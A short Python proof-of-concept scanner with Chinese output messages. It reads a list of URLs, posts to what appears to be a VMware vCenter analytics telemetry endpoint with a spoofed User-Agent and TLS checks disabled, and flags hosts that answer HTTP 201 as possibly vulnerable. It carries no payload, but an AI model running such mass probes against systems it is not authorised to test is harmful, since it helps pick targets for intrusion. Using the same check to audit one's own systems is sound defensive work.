import sys
import requests
import urllib3
urllib3.disable_warnings()

def url_format(url):
    url = url.strip()
    if "https://" not in url and "http://" not in url:
        url = "https://"+url
    if url.endswith('/'):
        return url
    else:
        return(url+'/')

try:
    file_name = sys.argv[1]
except:
    print("请输入文件名，例如：python poc.py url.txt")
    exit(0)
with open(file_name) as url_file:
    urls = url_file.readlines()
    for url in urls:
        url = url_format(url)
        poc_url = url+"analytics/telemetry/ph/api/hyper/send?_c&_i=test"
        poc_headers = {"User-Agent": "vAPI/2.100.0 Java/1.8.0_261 (Linux; 4.19.160-6.ph3; amd64)", "Accept": "*/*", "Content-Type": "application/json", "Connection": "close"}
        poc_data = "test"
        try:
            req = requests.post(poc_url, headers=poc_headers, data=poc_data, verify=False)
            if(req.status_code == 201):
                print(url+" 可能存在漏洞！！！！")
            else:
                print(url+" 安全")
        except:
            print(url+" 访问失败")